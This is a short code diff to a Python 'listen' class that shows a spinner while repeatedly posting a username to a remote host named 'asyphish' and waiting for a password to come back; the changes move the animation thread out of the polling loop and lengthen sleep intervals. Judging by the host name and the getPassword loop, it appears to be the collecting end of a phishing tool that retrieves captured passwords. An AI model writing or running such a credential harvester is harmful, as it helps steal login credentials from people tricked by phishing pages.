@@ -15,16 +15,16 @@ class listen:
                 break
             sys.stdout.write('\rlistening ' + c)
             sys.stdout.flush()
-            time.sleep(0.3)
+            time.sleep(0.5)
 
 
     def getPassword(self):
-
+        t = threading.Thread(target=self.animate)
+        t.start()
+            
         while True:
             password = requests.post("https://asyphish.herokuapp.com/ara", data={"name":self.username})
-            t = threading.Thread(target=self.animate)
-            t.start()
-
+            time.sleep(0.5)
             if password.status_code == 500:
                 pass
             else:
